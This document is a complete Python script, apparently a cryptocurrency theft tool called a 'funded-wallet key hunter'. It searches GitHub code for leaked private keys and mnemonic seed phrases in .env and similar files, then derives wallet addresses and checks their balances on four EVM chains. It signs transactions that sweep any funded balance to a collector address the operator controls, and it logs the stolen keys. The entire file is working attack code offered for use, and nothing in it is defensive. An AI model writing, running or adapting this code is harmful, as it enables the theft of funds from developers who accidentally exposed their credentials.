#!/usr/bin/env python3
"""
Funded-wallet key hunter.

"""

import os
import re
import sys
import json
import time
import getpass
import requests
from eth_account import Account

Account.enable_unaudited_hdwallet_features()

# ---------------- CONFIG ----------------
GITHUB_TOKEN = os.environ.get("GH_TOKEN", "").strip()
COLLECTOR = os.environ.get("COLLECTOR", "").strip()

STATE_FILE = "state.json"
LOG_FILE = "hits.log"

CHAINS = {
    "base": {
        "rpc": "https://mainnet.base.org",
        "chain_id": 8453,
        "symbol": "ETH",
        "dust": 0.0002,
        "gas_buffer": 1.5,
    },
    "bsc": {
        "rpc": "https://bsc-dataseed.binance.org",
        "chain_id": 56,
        "symbol": "BNB",
        "dust": 0.002,
        "gas_buffer": 1.6,
        "min_gas_price": 1_000_000_000,
    },
    "arbitrum": {
        "rpc": "https://arb1.arbitrum.io/rpc",
        "chain_id": 42161,
        "symbol": "ETH",
        "dust": 0.0002,
        "gas_buffer": 1.6,
    },
    "polygon": {
        "rpc": "https://polygon-rpc.com",
        "chain_id": 137,
        "symbol": "MATIC",
        "dust": 0.01,
        "gas_buffer": 1.6,
        "min_gas_price": 30_000_000_000,
    },
}

SWEEP_ENABLED = True
MAX_FILES_PER_RUN = 400
MAX_PER_REPO = 3
SEARCH_DELAY = 7.0
QUERIES_PER_RUN = 4
PER_PAGE = 100
PAGES = 3

TEST_KEYS = {
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d",
}

QUERIES = [
    "PRIVATE_KEY= in:file",
    "PRIVATE_KEY in:file",
    "WALLET_PRIVATE_KEY in:file",
    "PRIVATE_KEY path:.env",
    "PRIVATE_KEY path:env",
    "MNEMONIC path:.env",
    "MNEMONIC= in:file",
    '"privateKey" in:file',
    "PRIVATE_KEY filename:env.txt",
    "PRIVATE_KEY extension:env",
]

HEX_KEY = re.compile(r"(?<![0-9a-fA-Fx])0x[0-9a-fA-F]{64}(?![0-9a-fA-F])")
PKEY_ASSIGN = re.compile(r"PRIVATE_KEY\s*[=:]\s*[\"']?(?:0x)?([0-9a-fA-F]{64})")
MNEMONIC = re.compile(
    r"(?:mnemonic|seed|secret|mnemonicPhrase)\s*[=:]\s*[\"']?((?:[a-z]{3,8}[ \t]+){11,23}[a-z]{3,8})",
    re.IGNORECASE,
)


# ---------------- CREDENTIALS ----------------
def resolve_creds():
    global GITHUB_TOKEN, COLLECTOR

    if not COLLECTOR:
        if not sys.stdin.isatty():
            raise SystemExit("no COLLECTOR set and no terminal to ask")
        COLLECTOR = input("Collector wallet address (0x...): ").strip()
        if not re.fullmatch(r"0x[0-9a-fA-F]{40}", COLLECTOR):
            raise SystemExit("that doesn't look like an address")

    if not GITHUB_TOKEN:
        if not sys.stdin.isatty():
            raise SystemExit("no GH_TOKEN set and no terminal to ask")
        GITHUB_TOKEN = getpass.getpass("GitHub token (ghp_..., hidden): ").strip()
        if not GITHUB_TOKEN:
            raise SystemExit("no token given")

    print("[*] collector: " + COLLECTOR, flush=True)
    print("[*] token: " + GITHUB_TOKEN[:7] + "..." + GITHUB_TOKEN[-4:], flush=True)


# ---------------- HELPERS ----------------
def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {"seen_addresses": [], "seen_urls": [], "q_offset": 0}


def save_state(state):
    state["seen_addresses"] = state["seen_addresses"][-15000:]
    state["seen_urls"] = state["seen_urls"][-8000:]
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)


def log(line):
    print(line, flush=True)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def gh_headers():
    return {
        "Accept": "application/vnd.github+json",
        "Authorization": "Bearer " + GITHUB_TOKEN,
        "X-GitHub-Api-Version": "2022-11-28",
    }


def rpc(chain, method, params):
    cfg = CHAINS[chain]
    r = requests.post(
        cfg["rpc"],
        json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params},
        timeout=20,
    )
    r.raise_for_status()
    data = r.json()
    if "error" in data:
        raise RuntimeError(data["error"])
    return data["result"]


def get_balance_wei(chain, addr):
    return int(rpc(chain, "eth_getBalance", [addr, "latest"]), 16)


def get_gas_price(chain):
    cfg = CHAINS[chain]
    price = int(rpc(chain, "eth_gasPrice", []), 16)
    if "min_gas_price" in cfg:
        price = max(price, cfg["min_gas_price"])
    return price


def dust_wei(chain):
    return int(CHAINS[chain]["dust"] * 1e18)


# ---------------- EXTRACTION ----------------
def candidates_from(text):
    found = []
    for match in HEX_KEY.finditer(text):
        found.append(("key", match.group(0)))
    for match in PKEY_ASSIGN.finditer(text):
        key = match.group(1)
        found.append(("key", key if key.startswith("0x") else "0x" + key))
    for match in MNEMONIC.finditer(text):
        words = " ".join(match.group(1).split())
        if len(words.split()) in (12, 24):
            found.append(("mnemonic", words))
    return found


def derive(ctype, value):
    out = []
    if ctype == "key":
        try:
            out.append((Account.from_key(value).address, value))
        except Exception:
            pass
    else:
        for idx in (0, 1, 2):
            try:
                acct = Account.from_mnemonic(
                    value, account_path="m/44'/60'/0'/0/" + str(idx)
                )
                out.append((acct.address, acct.key.hex()))
            except Exception:
                break
    return out


# ---------------- SWEEP ----------------
def sweep(chain, privkey, balance_wei):
    cfg = CHAINS[chain]
    acct = Account.from_key(privkey)
    gas_price = get_gas_price(chain)
    gas_limit = 21000
    cost = int(gas_price * gas_limit * cfg["gas_buffer"])
    value = balance_wei - cost

    if value <= 0:
        return None, "gas exceeds balance"
    if value < dust_wei(chain):
        return None, "leftover below dust floor"

    nonce = int(
        rpc(chain, "eth_getTransactionCount", [acct.address, "pending"]), 16
    )
    tx = {
        "to": COLLECTOR,
        "value": value,
        "gas": gas_limit,
        "gasPrice": gas_price,
        "nonce": nonce,
        "chainId": cfg["chain_id"],
        "data": b"",
    }
    signed = acct.sign_transaction(tx)
    raw = signed.raw_transaction.hex()
    if not raw.startswith("0x"):
        raw = "0x" + raw
    txhash = rpc(chain, "eth_sendRawTransaction", [raw])
    return txhash, "%.8f %s" % (value / 1e18, cfg["symbol"])


# ---------------- SEARCH ----------------
def search_page(query, page, seen_urls, repo_counts):
    """One page of one query, with a rate-limit retry."""
    for attempt in (1, 2):
        try:
            r = requests.get(
                "https://api.github.com/search/code",
                params={
                    "q": query,
                    "sort": "indexed",
                    "order": "desc",
                    "per_page": PER_PAGE,
                    "page": page,
                },
                headers=gh_headers(),
                timeout=30,
            )
        except Exception as exc:
            log("[!] search fail (" + query + "): " + str(exc))
            return 0, []

        if r.status_code in (403, 429) and attempt == 1:
            wait = 45
            reset = r.headers.get("x-ratelimit-reset")
            if reset:
                try:
                    wait = max(10, min(120, int(reset) - int(time.time()) + 3))
                except Exception:
                    pass
            log("[!] rate limited, waiting %ds" % wait)
            time.sleep(wait)
            continue

        if r.status_code == 401:
            log("[!] token rejected")
            return 0, []
        if r.status_code == 422:
            log("[!] bad query: " + query)
            return 0, []
        if r.status_code != 200:
            log("[!] search status %d (%s)" % (r.status_code, query))
            return 0, []

        items = r.json().get("items", [])
        urls = []
        for item in items:
            repo = item["repository"]["full_name"]
            if repo_counts.get(repo, 0) >= MAX_PER_REPO:
                continue
            raw_url = "https://raw.githubusercontent.com/" + repo + "/HEAD/" + item["path"]
            if raw_url in seen_urls:
                continue
            repo_counts[repo] = repo_counts.get(repo, 0) + 1
            urls.append(raw_url)
        return len(items), urls

    return 0, []


def search_query(query, seen_urls, repo_counts):
    urls = []
    for page in range(1, PAGES + 1):
        count, got = search_page(query, page, seen_urls, repo_counts)
        urls.extend(got)
        if count == 0:
            break
        time.sleep(SEARCH_DELAY)
    log("[q] %d new from %s" % (len(urls), query[:45]))
    return urls


# ---------------- MAIN ----------------
def main():
    resolve_creds()

    state = load_state()
    seen = set(state["seen_addresses"])
    seen_urls = set(state["seen_urls"])
    repo_counts = {}

    offset = int(state.get("q_offset", 0) or 0)
    picks = [
        QUERIES[(offset + i) % len(QUERIES)]
        for i in range(min(QUERIES_PER_RUN, len(QUERIES)))
    ]
    state["q_offset"] = (offset + QUERIES_PER_RUN) % len(QUERIES)

    files = []
    for query in picks:
        files.extend(search_query(query, seen_urls, repo_counts))
        time.sleep(SEARCH_DELAY)

    log("[*] " + str(len(files)) + " fresh files, " + str(len(seen)) + " addresses already known")

    hits = 0
    fetched = 0
    derived = 0

    for idx, url in enumerate(files[:MAX_FILES_PER_RUN], 1):
        seen_urls.add(url)
        try:
            raw = requests.get(url, timeout=15)
            if raw.status_code != 200 or len(raw.text) > 400_000:
                continue
            text = raw.text
            fetched += 1
        except Exception:
            continue

        if idx % 25 == 0:
            log("[.] %d/%d scanned, %d fetched, %d addresses"
                % (idx, min(len(files), MAX_FILES_PER_RUN), fetched, derived))

        for ctype, value in candidates_from(text):
            if ctype == "key" and value.lower() in TEST_KEYS:
                continue
            for addr, priv in derive(ctype, value):
                if addr in seen:
                    continue
                seen.add(addr)
                derived += 1

                for chain in CHAINS:
                    try:
                        bal_wei = get_balance_wei(chain, addr)
                    except Exception:
                        continue
                    if bal_wei < dust_wei(chain):
                        continue

                    log(
                        "[HIT] %s %.8f %s %s (%s) <- %s"
                        % (chain, bal_wei / 1e18, CHAINS[chain]["symbol"], addr, ctype, url)
                    )
                    log("      key: " + priv)
                    hits += 1

                    if SWEEP_ENABLED:
                        try:
                            txhash, moved = sweep(chain, priv, bal_wei)
                            if txhash:
                                log("      swept " + moved + " -> " + COLLECTOR + " tx " + txhash)
                            else:
                                log("      not swept: " + moved)
                        except Exception as exc:
                            log("      sweep failed: " + str(exc))

    state["seen_addresses"] = list(seen)
    state["seen_urls"] = list(seen_urls)
    save_state(state)
    log("[*] done, %d scanned, %d fetched, %d addresses, %d funded"
        % (min(len(files), MAX_FILES_PER_RUN), fetched, derived, hits))


if __name__ == "__main__":
    main()